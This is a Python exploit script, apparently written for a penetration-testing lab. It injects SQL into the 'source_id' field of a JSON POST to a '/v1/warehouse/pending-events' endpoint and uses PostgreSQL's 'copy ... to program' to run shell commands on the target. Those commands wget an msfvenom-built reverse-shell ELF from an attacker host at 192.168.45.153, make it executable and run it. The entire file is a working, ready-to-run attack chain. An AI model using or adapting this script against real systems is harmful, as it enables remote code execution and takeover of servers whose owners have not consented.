import requests
import sys, os
import subprocess
import json

def send_sqli(ip, cmd):
  target = f"http://{ip}:8080/v1/warehouse/pending-events"
  headers = {
    "Content-Type": "application/json"
  }

  sourceID = f"'; copy (select 'a') to program '{cmd}'-- -"
  data = {
    "source_id": sourceID,
    "task_run_id": "1"
  }
  jsondata = json.dumps(data)

  proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
  }

  r = requests.post(target, headers=headers, data=jsondata, proxies=proxies)

  if r.status_code != 200:
    print("Execution Failed!")
    exit(0)
  else:
    print(r.text)

def generate_shell(LHOST, LPORT):
  cmd = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o reverse.elf"
  print("[+] Generating MSFvenom shell!")
  print("[+] Ensure that web server is running on port 8000!")

  # subprocess.run(cmd, shell=True)

def main():
  if len(sys.argv) != 2:
    print ("(+) usage: %s <target>" % sys.argv[0])
    print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
    sys.exit(-1)

  ip = sys.argv[1]

  LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
  LPORT = 9001

  generate_shell(LHOST, LPORT)

  send_sqli(ip, "wget http://192.168.45.153:8000/reverse.elf -O /tmp/reverse.elf")
  send_sqli(ip, "chmod +x /tmp/reverse.elf")
  send_sqli(ip, "/tmp/reverse.elf")

if __name__ == '__main__':
  main()